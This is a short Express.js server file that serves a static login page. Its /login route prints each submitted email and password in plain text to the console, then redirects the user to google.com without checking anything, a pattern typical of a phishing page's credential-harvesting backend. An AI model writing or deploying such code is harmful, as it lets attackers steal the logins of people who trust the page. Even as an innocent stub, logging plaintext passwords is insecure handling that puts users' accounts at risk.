// server.js

const express = require("express");
const path = require("path");

const app = express();
const PORT = 3000;

// ✅ Middleware (must come after app is created)
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Serve everything inside /assets (CSS, JS, images, HTML)
app.use(express.static(path.join(__dirname, "assets")));

// ✅ Load your main HTML page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "assets", "index.html"));
});

// ✅ Handle login
app.post("/login", (req, res) => {
  const { email, password } = req.body;

  console.log("Email:", email);
  console.log("Password:", password);

  // redirect after submit
  res.redirect("https://google.com");
});

// ✅ Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});